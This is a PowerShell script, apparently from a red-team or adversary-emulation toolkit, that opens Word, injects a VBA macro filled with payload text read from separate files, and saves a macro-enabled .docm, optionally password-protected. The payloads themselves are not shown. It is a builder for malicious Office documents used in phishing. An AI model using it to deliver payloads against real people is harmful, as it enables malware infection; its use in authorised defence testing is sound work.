Import-Module $PSScriptRoot\..\..\internals\utils.psm1
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    SetAuthor

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false

    $fname = "$PSScriptRoot\Doc1.docm"

    $wdDoc = $wdApp.documents.open($fname)

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro -adversary $adversary
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")
    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")

    $var_counter = 1
    do {
        $this_var_name = "aPAYLOAD" + $var_counter + "a"
        $randName = RandTextAlphanumeric -len 15
        if ($macro.contains($this_var_name)) {
            $macro = $macro -replace $this_var_name, $payload
        } else {
            break
        }
        $var_counter++
    } while ($true)

    return $macro

}